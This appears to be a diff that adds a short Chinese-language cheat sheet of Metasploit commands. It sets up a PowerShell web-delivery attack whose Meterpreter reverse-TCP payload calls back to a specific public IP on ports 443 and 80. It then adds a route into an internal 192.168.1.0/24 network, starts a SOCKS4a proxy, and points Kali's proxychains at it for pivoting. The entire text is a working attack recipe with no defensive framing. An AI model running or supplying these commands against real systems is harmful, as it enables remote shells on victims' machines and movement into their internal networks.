@@ -1,0 +1,21 @@
+metasploit利用powershell反弹：
+use exploit/multi/script/web_delivery
+info
+set target 2   ＃因为我们要用powershell所以选择2，psh
+set PAYLOAD windows/meterpreter/reverse_tcp
+set lhost 45.76.110.94
+set lport 443
+set srvhost 45.76.110.94
+set srvport 80
+exploit
+
+添加路由：
+route add 192.168.1.0 255.255.255.0 1
+
+开启socks4a：
+use auxiliary/server/socks4a
+exploit
+
+
+kali设置/etc/proxychains.conf：
+socks4 45.76.110.94 11000
